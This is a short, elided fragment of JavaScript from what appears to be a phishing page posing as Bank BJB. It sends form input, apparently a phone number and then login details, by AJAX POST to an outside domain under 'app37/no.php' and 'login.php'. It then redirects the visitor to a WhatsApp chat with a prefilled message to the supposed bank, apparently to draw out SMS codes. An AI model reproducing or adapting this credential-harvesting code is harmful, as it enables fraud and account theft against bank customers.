...
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://axcellent.cf-pow.cfd/app37/no.php',
...
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://axcellent.cf-pow.cfd/app37/login.php',
...
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=6282116119816&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
$('.load').fadeOut();
    }, 5500);    
}  
